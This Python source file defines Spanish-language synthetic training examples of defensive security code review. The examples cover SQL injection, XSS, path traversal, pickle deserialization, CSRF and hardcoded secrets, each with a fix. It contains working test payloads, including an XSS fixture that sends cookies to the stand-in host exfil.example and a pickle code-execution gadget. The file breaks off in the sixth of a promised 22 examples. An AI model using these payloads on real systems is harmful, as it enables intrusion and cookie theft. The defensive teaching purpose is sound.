"""
m_review_arch2.py — Módulo 3-d del dataset AI-ku_programming (Stack V2).

22 ejemplos de:
  * SEGURIDAD DEFENSIVA (10): código vulnerable PROPORCIONADO en contexto de
    laboratorio interno autorizado; el assistant localiza el vector, explica
    cómo se explota, prioriza por severidad y entrega código corregido que
    VERIFICA por ejecución cuando el lenguaje lo permite (python/js/bash/sql);
    PHP queda NO EJECUTADO de forma honesta (solo sintaxis). Cobertura:
    SQLi, XSS, path traversal, deserialización insegura (pickle/eval), CSRF
    en PHP, secretos hardcodeados, SSRF, permisos de ficheros, validación de
    entrada y TOCTOU. Nunca ofensivo contra terceros.
  * ARQUITECTURA (12): decisiones con trade-offs reales comparados (coste,
    complejidad, riesgo, operación), rechazo explícito de sobre-ingeniería.
    3 mini-ADR estructurados (Contexto/Decisión/Consecuencias). Los ejemplos
    de arquitectura pura van sin verificación (estáticos); los tres con
    pseudocódigo python ilustrativo se verifican por ejecución.

Contenido en español (identificadores en inglés). Sin secretos reales:
las credenciales que aparecen son claramente ficticias de laboratorio.
"""

from schema import E

EXAMPLES = [

    # =====================================================================
    # SEGURIDAD DEFENSIVA (10) — S1..S10
    # =====================================================================

    # S1 — SQL injection (python/sqlite): parámetros, no concatenación
    E(
        language="python", domain="security", subdomain="sqli_parametrizado",
        difficulty="hard", task_type="code_review",
        messages=[
            ("user", """Revisión de seguridad previa a fusión, en entorno de laboratorio interno (base de datos desechable, red aislada, autorización explícita del equipo de plataforma; nada contra sistemas de terceros). Te paso el módulo `buscador.py` de la intranet de clientes (Python 3.12 + sqlite3). En los logs de pruebas aparecen consultas anómalas del tipo `pais = '' OR '1'='1'` que provienen del parámetro de búsqueda.

```python
# repro_laboratorio.py — replica la consulta de buscador.py contra una BD de prueba
import sqlite3

CONEXION = sqlite3.connect(":memory:")
CONEXION.executescript(
    "CREATE TABLE clientes (id INTEGER PRIMARY KEY, nombre TEXT, pais TEXT);"
    "INSERT INTO clientes (nombre, pais) VALUES ('Ana','ES'),('Boris','DE'),('Carla','ES');"
)

def buscar_por_pais(pais):
    consulta = "SELECT id, nombre FROM clientes WHERE pais = '" + pais + "'"
    return CONEXION.execute(consulta).fetchall()

payload = "' OR '1'='1"
filas = buscar_por_pais(payload)
print("payload %r -> %d filas (esperadas: 0)" % (payload, len(filas)))
for fila in filas:
    print("fuga:", fila)
```

Necesito: (1) reproducir el problema, (2) localizar el vector y explicar cómo entra el payload, (3) priorizar por severidad, (4) el código corregido y (5) evidencia por ejecución de que el payload ya no altera la consulta sin romper la búsqueda legítima."""),
            ("assistant", """**Vector localizado (CWE-89, severidad crítica, OWASP A03:2021).**

Flujo de datos no confiables: parámetro HTTP → `buscar_por_pais(pais)` → concatenación en la línea del sink:

```python
consulta = "SELECT id, nombre FROM clientes WHERE pais = '" + pais + "'"
```

Con el payload `' OR '1'='1` la consulta resultante es `WHERE pais = '' OR '1'='1'`: la comilla simple cierra el literal, el `OR '1'='1'` es siempre verdadero y el resto se comporta como comentario. El valor del usuario se interpreta como **código SQL**, no como dato. En este esquema el impacto es leer la tabla completa; el mismo patrón aplicado a `DELETE`/`UPDATE` (o con motores que apilan sentencias) escala a modificación y destrucción de datos, por eso lo trato como crítico aunque la tabla de prueba sea pequeña.

**Por qué no me propongo a filtrar caracteres:** las listas negras (`str.replace("'", "")`, escapado manual) son frágiles: codificaciones alternativas, contextos distintos y olvidos en futuras llamadas las rompen. La corrección correcta y estable es **parametrizar**: el driver envía la sentencia y los valores por canales separados, de modo que el valor nunca se parsea como SQL. Complementos de defensa en profundidad: usuario de BD con privilegio mínimo para esta conexión y alerta sobre consultas anómalas. Ejecuto primero el repro para confirmar el hallazgo antes de corregir."""),
            ("tool", """$ python3 repro_laboratorio.py
payload "' OR '1'='1" -> 3 filas (esperadas: 0)
fuga: (1, 'Ana')
fuga: (2, 'Boris')
fuga: (3, 'Carla')"""),
            ("assistant", """Repro confirmado: 3 filas donde debían ser 0. Corrección: **consultas parametrizadas** (placeholder `?` y tupla de valores). Con eso el payload es solo un valor comparado literalmente; ni siquiera `'; DROP TABLE clientes; --` altera nada, porque viaja como dato.

```python
# buscador.py (corregido) — consultas parametrizadas + autocomprobacion
import sqlite3

CONEXION = sqlite3.connect(":memory:")
CONEXION.executescript(
    "CREATE TABLE clientes (id INTEGER PRIMARY KEY, nombre TEXT, pais TEXT);"
    "INSERT INTO clientes (nombre, pais) VALUES ('Ana','ES'),('Boris','DE'),('Carla','ES');"
)

def buscar_por_pais(pais):
    # El valor viaja por el canal de parametros: nunca se interpreta como SQL
    consulta = "SELECT id, nombre FROM clientes WHERE pais = ?"
    return CONEXION.execute(consulta, (pais,)).fetchall()

pruebas = [
    ("' OR '1'='1", 0),
    ("' OR 1=1 --", 0),
    ("'; DROP TABLE clientes; --", 0),
    ("ES", 2),
    ("DE", 1),
]
for entrada, esperadas in pruebas:
    filas = buscar_por_pais(entrada)
    estado = "OK" if len(filas) == esperadas else "FALLO"
    print("%s payload=%r -> %d filas (esperadas: %d)" % (estado, entrada, len(filas), esperadas))
    assert len(filas) == esperadas
assert CONEXION.execute("SELECT COUNT(*) FROM clientes").fetchone()[0] == 3
print("verificado: la tabla sigue intacta y el payload no altera la consulta")
```

Puntos clave para el equipo: (a) el `?` no es un «escapado», es separación de canales; (b) si algún día necesitas orden o nombre de columna dinámico, ese identificador NO se parametriza: se resuelve con una lista blanca interna (`{"fecha": "fecha", ...}`); (c) no confíes en que sqlite no apile sentencias: la corrección vale para cualquier motor."""),
        ],
        verify=[
            {"name": "repro_inyeccion", "action": "run", "lang": "python", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["-> 3 filas (esperadas: 0)", "fuga: (3, 'Carla')"],
             "timeout_s": 10},
            {"name": "fix_parametrizado", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["OK payload=\"' OR '1'='1\" -> 0 filas (esperadas: 0)",
                                         "OK payload='ES' -> 2 filas (esperadas: 2)",
                                         "verificado: la tabla sigue intacta"],
             "timeout_s": 10},
        ],
        tags=["sql-injection", "parameterized-queries", "sqlite", "owasp-a03"],
        stack=["python", "sqlite3"], recovery=False,
    ),

    # S2 — XSS reflejado/almacenado (javascript): escapado por contexto
    E(
        language="javascript", domain="security", subdomain="xss_escape_html",
        difficulty="hard", task_type="code_review",
        messages=[
            ("user", """Revisión de seguridad en laboratorio interno (sin tráfico real, nada contra terceros). El widget de comentarios se renderiza en el servidor con Node 24 para producir el HTML inicial; un pentest interno escribió un comentario de prueba y el navegador de otro empleado ejecutó su código. Este es el render actual, reducido para poder reproducirlo en consola:

```javascript
// repro_comentarios.js — render SSR del widget de comentarios (solo consola, sin servidor)
'use strict';
function renderComentarios(comentarios) {
  return "<ul>" + comentarios.map((c) =>
    `<li data-author="${c.autor}">${c.texto}</li>`).join("") + "</ul>";
}
const hostil = {
  autor: `anon"><img src=x onerror="fetch('https://exfil.example/?c='+document.cookie)">`,
  texto: `<script>new Image().src="https://exfil.example/?c="+document.cookie</script>`,
};
console.log(renderComentarios([hostil]));
```

Quiero que ejecutes el repro, me expliques el vector y la severidad, y me entregues la corrección verificada: el mismo payload debe aparecer en la salida como TEXTO inofensivo, no como markup ejecutable."""),
            ("assistant", """**Vector (CWE-79, severidad alta): XSS por interpolación directa en dos contextos.** `c.autor` entra dentro de un **atributo HTML** (`data-author="..."`) y `c.texto` en el **cuerpo de un elemento**. El payload del autor abre la comilla del atributo y cierra la etiqueta, colando un `<img onerror>`; el del texto inyecta un `<script>` directo. Al pegar la salida en una página, el navegador ejecuta el `onerror`/script en el origen legítimo: robo de sesión (si la cookie no es httponly), acciones en nombre del usuario y persistencia (XSS almacenado, porque el comentario queda en BD).

**Corrección correcta por contexto, no un filtro global:** en HTML (texto y atributos delimitados por comillas) basta escapar `& < > " '`. Ojo con la idea frecuente de «quitar `<script>`»: se evade con `<img onerror>` o con vectores en mayúsculas/eventos; la regla robusta es escapar TODO lo dinámico y, si algún día aceptáis HTML enriquecido, sanear con una librería de listas blancas (p. ej. DOMPurify), nunca con expresiones regulares propias. Capas adicionales que recomiendo: cabecera CSP (`script-src 'self'`) como red de seguridad y cookies de sesión `HttpOnly` para reducir el daño de una fuga. Ejecuto el repro primero."""),
            ("tool", """$ node repro_comentarios.js
<ul><li data-author="anon"><img src=x onerror="fetch('https://exfil.example/?c='+document.cookie)">"><script>new Image().src="https://exfil.example/?c="+document.cookie</script></li></ul>"""),
            ("assistant", """Repro confirmado: el HTML de salida contiene el payload como markup activo. Corrección: escapar cada valor en su contexto con `escapeHtml` antes de interpolar, y verificar que el mismo payload queda neutralizado.

```javascript
// render_comentarios.js (corregido) — escapado por contexto + autocomprobacion
'use strict';
function escapeHtml(valor) {
  return String(valor).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

function renderComentarios(comentarios) {
  return "<ul>" + comentarios.map((c) =>
    `<li data-author="${escapeHtml(c.autor)}">${escapeHtml(c.texto)}</li>`).join("") + "</ul>";
}

const hostil = {
  autor: `anon"><img src=x onerror="fetch('https://exfil.example/?c='+document.cookie)">`,
  texto: `<script>new Image().src="https://exfil.example/?c="+document.cookie</script>`,
};
const html = renderComentarios([hostil]);
console.log(html);

const asert = (cond, msg) => { if (!cond) { console.error("FALLO: " + msg); process.exit(1); } };
asert(!html.includes("<img src=x"), "payload sin escapar");
asert(!html.includes("<script>"), "script sin escapar");
asert(html.includes("&lt;img src=x"), "payload escapado presente");
asert(html.includes("&quot;"), "comillas dobles escapadas");
console.log("XSS bloqueado: el payload llega como texto, no como markup");
```

El verificado automático exige que el payload NO aparezca ya como etiqueta y SÍ como entidades escapadas: en la página se verá literalmente el intento de ataque, inofensivo. Dos avisos de contexto que dejo anotados: si interpoláis el valor dentro de un evento `onclick="..."` (contexto JS), escapar HTML no basta: usad serialización JSON y evitados ese patrón; y si el dato va a un `href`, validad esquema (`https:` solamente) para bloquear `javascript:`."""),
        ],
        verify=[
            {"name": "repro_xss", "action": "run", "lang": "js", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["<img src=x onerror=", "<script>new Image()"],
             "timeout_s": 10},
            {"name": "fix_escapeado", "action": "run", "lang": "js", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["&lt;img src=x onerror=&quot;", "XSS bloqueado"],
             "expect_stdout_not_contains": ["<img src=x", "<script>"],
             "timeout_s": 10},
        ],
        tags=["xss", "html-escaping", "node", "owasp-a03"],
        stack=["javascript", "node"], recovery=False,
    ),

    # S3 — Path traversal (python): canonicalizar y comparar con la raiz
    E(
        language="python", domain="security", subdomain="path_traversal_descarga",
        difficulty="hard", task_type="code_review",
        messages=[
            ("user", """Laboratorio interno autorizado (ficheros de prueba en contenedor desechable). El portal de documentación interna expone descargas con este módulo; un compañero detectó que la URL `/descargar?nombre=../credenciales_internas.txt` devuelve algo que no debía. Reproducción reducida y autocontenida:

```python
# repro_descargas.py — version vulnerable en un directorio de prueba
import os

BASE = "public"
os.makedirs(BASE, exist_ok=True)
with open(os.path.join(BASE, "aviso.txt"), "w", encoding="utf-8") as fh:
    fh.write("contenido publico")
with open("credenciales_internas.txt", "w", encoding="utf-8") as fh:
    fh.write("PASSWORD=valor-ficticio-de-laboratorio\\n")   # simula un fichero fuera de BASE

def descargar(nombre_solicitado):
    ruta = os.path.normpath(os.path.join(BASE, nombre_solicitado))
    with open(ruta, encoding="utf-8") as fh:
        return fh.read()

ataque = "../credenciales_internas.txt"
try:
    print("v1 TRAVERSAL EXITOSO:", descargar(ataque).splitlines()[0])
except OSError as exc:
    print("v1 bloqueado:", exc)
```

Ejecuta el repro, explica por qué `normpath` no protege, prioriza y entrega la corrección verificada (el ataque debe ser rechazado y la descarga legítima debe seguir funcionando)."""),
            ("assistant", """**Vector (CWE-22, severidad alta): path traversal por unión de rutas no validadas.** `os.path.join(BASE, "../credenciales_internas.txt")` produce `public/../credenciales_internas.txt` y `normpath` lo **canoniza a texto** como `credenciales_internas.txt`: es decir, no solo permite el `..`, sino que amablemente lo resuelve. `normpath` es una utilidad sintáctica: no sabe qué directorio es la frontera legítima.

Descarté en primer lugar el «parche obvio» de hacer `nombre.replace("..", "")`: se evade con `....//` (el `normpath` posterior reconstruye `..`) y con variantes codificadas según la capa que decodifique antes. La regla robusta es: **canonicalizar con `realpath` (resuelve symlinks incluidos) y exigir que la ruta final esté DENTRO de la raíz permitida** (`commonpath`); adicionalmente rechazar byte NUL y rutas absolutas antes de unir. Defensa en profundidad si el servidor lo permite: abrir con `dirfd`/`openat` relativo a un descriptor del directorio base, y ejecutar el proceso con permisos que no vean nada fuera de `BASE`. Prioridad: alta, porque del directorio web pueden salir ficheros de configuración y claves. Verifico con ejecución."""),
            ("tool", """$ python3 repro_descargas.py
v1 TRAVERSAL EXITOSO: PASSWORD=valor-ficticio-de-laboratorio"""),
            ("assistant", """Repro confirmado: el fichero fuera de `BASE` se leyó. Corrección con canonicalización y control de frontera:

```python
# descargas.py (corregido) — canonicalizacion y validacion de raiz
import os

BASE = "public"
os.makedirs(BASE, exist_ok=True)
with open(os.path.join(BASE, "aviso.txt"), "w", encoding="utf-8") as fh:
    fh.write("contenido publico")
with open("credenciales_internas.txt", "w", encoding="utf-8") as fh:
    fh.write("PASSWORD=valor-ficticio-de-laboratorio\\n")   # simula un secreto fuera de BASE

def descargar(nombre_solicitado):
    if "\\x00" in nombre_solicitado:
        raise ValueError("nombre con byte NUL rechazado")
    raiz_real = os.path.realpath(BASE)
    ruta_real = os.path.realpath(os.path.join(BASE, nombre_solicitado))
    if os.path.commonpath([raiz_real, ruta_real]) != raiz_real:
        raise ValueError("ruta fuera del directorio permitido")
    with open(ruta_real, encoding="utf-8") as fh:
        return fh.read()

ataque = "../credenciales_internas.txt"
for prueba in (ataque, "/etc/passwd", "aviso.txt"):
    try:
        contenido = descargar(prueba)
        print("OK        %r -> %d bytes" % (prueba, len(contenido)))
    except (ValueError, OSError) as exc:
        print("RECHAZADO %r -> %s" % (prueba, exc))
assert not os.path.exists(os.path.join(BASE, "credenciales_internas.txt"))
print("verificado: el traversal ../credenciales_internas.txt no sale de la raiz")
```

Notas: `realpath` también neutraliza el caso de un symlink plantado dentro de `BASE` que apunte fuera (CWE-22 con symlinks); si el atacante puede crear symlinks, la alternativa fuerte es `os.open` con `O_NOFOLLOW` por componente. El caso absoluto (`/etc/passwd`) también queda rechazado por la misma comparación. Devuelve 400/404 genérico al cliente y registra el intento: los rechazos repetidos son señal de sondeo."""),
        ],
        verify=[
            {"name": "repro_traversal", "action": "run", "lang": "python", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["v1 TRAVERSAL EXITOSO: PASSWORD=valor-ficticio-de-laboratorio"],
             "timeout_s": 10},
            {"name": "fix_canonicalizacion", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["RECHAZADO '../credenciales_internas.txt' -> ruta fuera del directorio permitido",
                                         "OK        'aviso.txt' -> 17 bytes",
                                         "verificado: el traversal ../credenciales_internas.txt no sale de la raiz"],
             "timeout_s": 10},
        ],
        tags=["path-traversal", "canonicalization", "file-access"],
        stack=["python"], recovery=True,
    ),

    # S4 — Deserializacion insegura (pickle) + eval: RCE en consumidor de cola
    E(
        language="python", domain="security", subdomain="deserializacion_peligrosa",
        difficulty="very_hard", task_type="code_review",
        messages=[
            ("user", """Laboratorio interno autorizado, cola de tareas desechable. El consumidor de trabajos de imagen recibe bytes por la cola y los trata como configuración; también evalúa una expresión de texto que viene en el mensaje. Código actual:

```python
# repro_cola.py — el consumidor actual confia en bytes de la cola
import os, pickle

def _marcar(ruta):
    with open(ruta, "w", encoding="utf-8") as fh:
        fh.write("pwned")
    print("[x] gadget EJECUTADO durante pickle.loads (version vulnerable)")

class _Gadget:
    def __reduce__(self):
        return (_marcar, ("pwned.flag",))

mensaje = pickle.dumps(_Gadget())      # simulacion del input hostil del atacante
config = pickle.loads(mensaje)         # sink 1: deserializacion de objetos no confiables
print("vulnerable: flag existe =", os.path.exists("pwned.flag"))
if os.path.exists("pwned.flag"):
    os.remove("pwned.flag")

umbral = eval("20")                    # sink 2: eval sobre texto del mensaje
print("vulnerable: eval devolvio", umbral)
```

Si alguien compromete la cola (o un servicio vecino la publica), ¿qué puede hacer? Ejecuta el repro, explica el mecanismo, prioriza los dos sinks y entrega el consumidor corregido con evidencia de ejecución."""),
            ("assistant", """**Sinks y prioridad.**

1. `pickle.loads(mensaje)` — **crítico (CWE-502): ejecución remota de código.** `pickle` no es un formato de datos: es un protocolo de objetos que puede reconstruir objetos arbitrarios. Con `__reduce__`, el objeto deserializado INDICA qué callable invocar con qué argumentos: el propio `loads` ejecuta `_marcar("pwned.flag")`, y ese callable podría ser `os.system` con cualquier comando. Consideré y descarté «firmar el pickle con HMAC»: si la clave se filtra (es cuestión de tiempo con tantas imágenes de contenedor), volvemos al RCE, y la firma no arregla la semántica del formato. La corrección es de **formato**: intercambiar datos serializables planos (JSON) y validar el esquema con lista blanca de claves y tipos.
2. `eval(texto_del_mensaje)` — **crítico (CWE-95): también RCE.** Incluso «solo para números», un texto hostil como `__import__('os').system(...)` se evalúa como código Python completo. Sustituto: `ast.literal_eval`, que acepta únicamente literales (números, cadenas, contenedores) y rechaza llamadas e imports.

Hallazgo menor adicional: no hay límite de tamaño del mensaje (DoS por mensajes gigantes); lo anoto para la cola. Ejecuto el repro para dejar el RCE demostrado antes de corregir."""),
            ("tool", """$ python3 repro_cola.py
[x] gadget EJECUTADO durante pickle.loads (version vulnerable)
vulnerable: flag existe = True
vulnerable: eval devolvio 20"""),
            ("assistant", """RCE demostrado en el repro: el `loads` ejecutó el gadget del «atacante» y creó el fichero. Consumidor corregido: JSON + esquema estricto + `ast.literal_eval`, con autocomprobación de que el mismo payload hostil ya no ejecuta nada.

```python
# cargador_config.py (corregido) — JSON con esquema estricto; nada de pickle ni eval
import ast, json, os, pickle

FLAG = "pwned.flag"
if os.path.exists(FLAG):
    os.remove(FLAG)

def _marcar(ruta):
    with open(ruta, "w", encoding="utf-8") as fh:
        fh.write("pwned")
    print("[x] gadget EJECUTADO durante pickle.loads (version vulnerable)")

class _Gadget:
    def __reduce__(self):
        return (_marcar, (FLAG,))

bytes_hostiles = pickle.dumps(_Gadget())   # lo que enviaria el atacante por la cola

# --- version vulnerable (solo para contrastar en el laboratorio) ---
pickle.loads(bytes_hostiles)
print("vulnerable: flag existe =", os.path.exists(FLAG))
if os.path.exists(FLAG):
    os.remove(FLAG)

# --- version corregida ---
CLAVES_PERMITIDAS = {"debug": bool, "max_conexiones": int, "hosts": list}

def cargar_config(bytes_entrada):
    datos = json.loads(bytes_entrada.decode("utf-8"))      # formato de datos, no de objetos
    if not isinstance(datos, dict):
        raise ValueError("la config debe ser un objeto JSON")
    for clave, valor in datos.items():
        tipo = CLAVES_PERMITIDAS.get(clave)
        if tipo is None:
            raise ValueError("clave no permitida: %r" % clave)
        if not isinstance(valor, tipo):
            raise ValueError("tipo invalido para %r" % clave)
    if "max_conexiones" in datos and not 1 <= datos["max_conexiones"] <= 1000:
        raise ValueError("max_conexiones fuera de rango 1..1000")
    return datos

def expresion_segura(texto):
    # sustituto de eval(): solo literales (numeros, cadenas, listas, diccionarios)
    return ast.literal_eval(texto)

try:
    cargar_config(b'{"max_conexiones": 50, "hosts": ["api.int"], "extra": 1}')
except ValueError as exc:
    print("corregido rechaza clave extra:", exc)

cfg = cargar_config(b'{"max_conexiones": 50, "hosts": ["api.int"]}')
print("corregido carga config valida:", cfg)
print("corregido: flag existe =", os.path.exists(FLAG))

try:
    expresion_segura("__import__('os').system('true')")
except (ValueError, SyntaxError) as exc:
    print("literal_eval rechaza codigo:", type(exc).__name__)

assert os.path.exists(FLAG) is False
print("verificado: el gadget del atacante no llega a ejecutarse con el cargador corregido")
```

Detalle importante: la autocomprobación vuelve a fabricar el payload hostil (eso es seguro: es `dumps`, serializar) y lo procesa con ambas rutas para contrastar. En producción el consumidor NO debe importar pickle en absoluto; lo mantengo aquí solo para el contraste del laboratorio. Si algún día necesitáis tipos ricos (fechas, Decimal), añadidlos como cadenas con formato y construidos explícitamente tras validar, nunca deserializando objetos."""),
        ],
        verify=[
            {"name": "repro_rce_pickle", "action": "run", "lang": "python", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["[x] gadget EJECUTADO durante pickle.loads",
                                         "vulnerable: flag existe = True"],
             "timeout_s": 10},
            {"name": "fix_json_esquema", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["corregido: flag existe = False",
                                         "literal_eval rechaza codigo",
                                         "verificado: el gadget del atacante no llega a ejecutarse"],
             "timeout_s": 10},
        ],
        tags=["insecure-deserialization", "pickle", "eval", "rce", "cwe-502"],
        stack=["python"], recovery=True,
    ),

    # S5 — CSRF en formulario PHP: token sincronizador + SameSite (NO ejecutado: honesto)
    E(
        language="php", domain="security", subdomain="csrf_formulario_php",
        difficulty="hard", task_type="code_review",
        messages=[
            ("user", """Laboratorio interno de pentest (autorizado, sin terceros). Nuestro formulario de transferencias internas `transferir.php` quedó señalado: una página externa de prueba, con un formulario autoenviado, provocó una transferencia en la sesión de un voluntario conectado. Este es el fichero actual:

```php
<?php
// transferir.php (version actual) — sin token CSRF
session_start();

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    $importe = $_POST['importe'] ?? '';
    $destino = $_POST['destino'] ?? '';
    // registrar transferencia (persistencia omitida en el laboratorio)
    echo "OK: transferencia de $importe a $destino";
}
?>
<form method="post" action="/transferir.php">
  <label>Destino <input name="destino"></label>
  <label>Importe <input name="importe"></label>
  <button type="submit">Enviar</button>
</form>
```

En este entorno no tenemos servidor PHP en marcha: quiero el análisis, la corrección completa y una propuesta de plan de pruebas honesta (qué se puede verificar aquí y qué no)."""),
            ("assistant", """**Vector (CWE-352, severidad alta): CSRF.** El navegador adjunta la cookie de sesión a CUALQUIER petición hacia nuestro origen, también a las lanzadas desde una página ajena. Un formulario oculto externo con `action="https://interna.example/transferir.php"` y `method=post` autoenviado provoca la transferencia con la sesión de la víctima: el servidor no puede distinguir un POST «suyo» de uno forjado. Lo que salva a este endpoint no es validar más el importe: es exigir un **secreto que el atacante no pueda leer** (política de mismo origen impide leer la respuesta/página de nuestro origen).

**Corrección (patrón sincronizador):** token aleatorio por sesión (`random_bytes`), incluido como campo oculto, verificado en el POST con `hash_equals` (comparación en tiempo constante) y **rotado tras cada uso**. Refuerzo de cookie con `SameSite=Lax` (bloquea la mayoría de POSTs cruzados), `Secure` y `HttpOnly`. No me apoyo en `Referer` (proxies y privacidad lo rompen) ni solo en SameSite (navegadores antiguos y subdominios). Hallazgo secundario: el `echo "OK: transferencia de $importe..."` imprime entrada sin escapar (XSS reflejado); lo corrijo de paso.

**Honestidad sobre la verificación:** aquí NO puedo ejecutar el flujo (necesita servidor web + navegador con sesiones); verifico sintaxis con `php -l`. Plan de pruebas en staging: (1) POST sin token → 403; (2) POST con token de otra sesión → 403; (3) flujo legítimo con token vigente → OK y transferencia registrada; (4) el formulario externo no puede obtener el token (mismo origen lo impide); (5) reuso del token ya consumido → 403.

```php
<?php
// transferir.php (corregido) — token CSRF sincronizador + cookie reforzada
declare(strict_types=1);

session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Lax',
]);
session_start();

// Token por sesion, generado con aleatoriedad criptografica
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

function csrf_campo(): string {
    return '<input type="hidden" name="csrf_token" value="'
        . htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8')
        . '">';
}

function csrf_verificar(): void {
    $enviado  = $_POST['csrf_token'] ?? '';
    $esperado = $_SESSION['csrf_token'] ?? '';
    if (!is_string($enviado) || $enviado === '' || !hash_equals($esperado, $enviado)) {
        http_response_code(403);
        exit('peticion rechazada: token CSRF invalido');
    }
    // uso unico: rotar para la siguiente operacion
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    csrf_verificar();

    $importe = filter_input(INPUT_POST, 'importe', FILTER_VALIDATE_FLOAT);
    $destino = filter_input(INPUT_POST, 'destino', FILTER_DEFAULT);
    if ($importe === false || $importe === null || $importe <= 0
            || !is_string($destino) || $destino === '') {
        http_response_code(422);
        exit('datos de transferencia invalidos');
    }
    // registrar la transferencia (persistencia omitida en el laboratorio)
    echo 'OK: transferencia registrada';
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Transferencia interna</title></head>
<body>
<form method="post" action="/transferir.php">
  <?= csrf_campo() ?>
  <label>Destino <input name="destino" required></label>
  <label>Importe <input name="importe" type="number" step="0.01" min="0.01" required></label>
  <button type="submit">Enviar</button>
</form>
</body>
</html>
```

Notas de implementación: `htmlspecialchars` al INCORPORAR el token al HTML (y para cualquier dato de salida); `hash_equals` en lugar de `===` para no abrir puerta a comparación temporal; si añadís operaciones aún más sensibles, subid la fricción (reconfirmación de contraseña o segundo factor) porque el token mitiga el forjado, no una sesión ya comprometida."""),
        ],
        verify=[
            {"name": "sintaxis_php_corregido", "action": "syntax", "lang": "php", "msg": -1, "block": 0,
             "timeout_s": 10},
        ],
        tags=["csrf", "php", "session-security", "owasp-a01"],
        stack=["php"], recovery=False,
    ),

    # S6 — Secretos hardcodeados: gestion segura (analisis + fail-fast verificado)
    E(
        language="python", domain="security", subdomain="gestion_secretos",
        difficulty="hard", task_type="analysis",
        messages=[
            ("user", """Auditoría interna del repositorio `servicio-facturacion` (todas las credenciales mostradas son FICTICIAS, preparadas para este laboratorio). `git grep` de higiene arroja esto:

```python
# config.py (SNAPSHOT del HEAD) — credenciales FICTICIAS de laboratorio
DB_HOST = "db-prod.int"
DB_USER = "billing_app"
DB_PASSWORD = "billing-2024-ficticio"
SMTP_PASSWORD = "smtp-billing-2024-ficticio"
SIGNING_KEY = "clave-firma-ficticia-2024"
```

```yaml
# docker-compose.yml (SNAPSHOT)
services:
  app:
    environment:
      - DB_PASSWORD=billing-2024-ficticio
      - SMTP_PASSWORD=smtp-billing-2024-ficticio
```

Además, `.env` está versionado en el repositorio y estas líneas llevan desde 2023 en el histórico. Necesito: (1) análisis honesto de qué está expuesto y por qué importa aunque «solo tengamos acceso nosotros», (2) plan de remediación priorizado y (3) el `config.py` corregido con verificación por ejecución de su comportamiento de fallo seguro."""),
            ("assistant", """**Qué está expuesto y por qué importa (severidad crítica de proceso, no de exploit puntual).**

- `DB_PASSWORD`, `SMTP_PASSWORD` y `SIGNING_KEY` están en el **histórico de git**, no solo en HEAD: borrarlos de HEAD no los borra de `git log -p`, clones locales, backups, ni de las cachés de plataformas de forja. La regla operativa: **todo lo que estuvo en el histórico debe considerarse filtrado y rotarse**.
- Riesgos concretos: cualquier acceso de lectura al repo (un token de CI filtrado, un ex-compañero, un mirror) da acceso a BD y correo de producción; la `SIGNING_KEY` firma tokens/cargas: filtrada permite FORJAR firmas válidas, que es peor que una contraseña; los valores también acaban en `docker inspect`, capas de imagen y logs de CI si alguien imprime config.

**Plan priorizado:**
1. **Rotar TODAS las credenciales expuestas** (BD, SMTP, firma) — es lo único que revierte el daño, y primero.
2. Mover los valores a variables de entorno inyectadas por el orquestador (o gestor de secretos cuando haya Rotación automatizada); el repo solo conserva NOMBRES.
3. Quitar `.env` del control de versiones (`.gitignore`) y publicar un `.env.example` con claves vacías como contrato de configuración.
4. Reescribir el histórico **solo después** de rotar (git-filter-repo), coordinando los clones; es higiene, no la solución.
5. Prevención: hook pre-commit con detector de secretos y reglas en CI; fallar el arranque si falta configuración (fail-fast) en lugar de valores por defecto.

**Código corregido:** el cargador exige las tres variables, lista qué falta (nombres, nunca valores) y aborta con código de salida 2. Verifico por ejecución ambos caminos (sin secretos → fallo rápido; con secretos → OK y sin imprimir valores)."""),
            ("tool", """$ python3 config_loader_test.py
sin entorno -> exit 2 | FALTAN_SECRETOS:APP_DB_URL,APP_DB_PASSWORD,APP_SIGNING_KEY
con entorno -> exit 0 | config cargada desde entorno: OK (los valores nunca se imprimen)
fail-fast verificado; el error lista nombres, nunca valores"""),
            ("assistant", """Evidencia de ejecución: sin variables el proceso aborta con código 2 y lista SOLO nombres; con variables carga sin imprimir nunca los valores (un error de log no filtrará credenciales). Este es el módulo y su autocomprobación:

```python
# config_loader.py (corregido) + autocomprobacion de fallo seguro
import subprocess, sys

LOADER = '''
import os, sys
requeridas = ("APP_DB_URL", "APP_DB_PASSWORD", "APP_SIGNING_KEY")
faltan = [s for s in requeridas if not os.environ.get(s)]
if faltan:
    print("FALTAN_SECRETOS:" + ",".join(faltan), file=sys.stderr)
    sys.exit(2)
print("config cargada desde entorno: OK (los valores nunca se imprimen)")
'''

def ejecutar(entorno_extra):
    env = {"LC_ALL": "C"}
    env.update(entorno_extra)
    return subprocess.run([sys.executable, "-c", LOADER],
                          capture_output=True, text=True, env=env)

r1 = ejecutar({})
print("sin entorno -> exit %d | %s" % (r1.returncode, r1.stderr.strip()))

r2 = ejecutar({
    "APP_DB_URL": "postgresql://db.int:5432/app",
    "APP_DB_PASSWORD": "valor-de-laboratorio",
    "APP_SIGNING_KEY": "clave-de-laboratorio",
})
print("con entorno -> exit %d | %s" % (r2.returncode, r2.stdout.strip()))

assert r1.returncode == 2, "debe fallar rapido sin secretos"
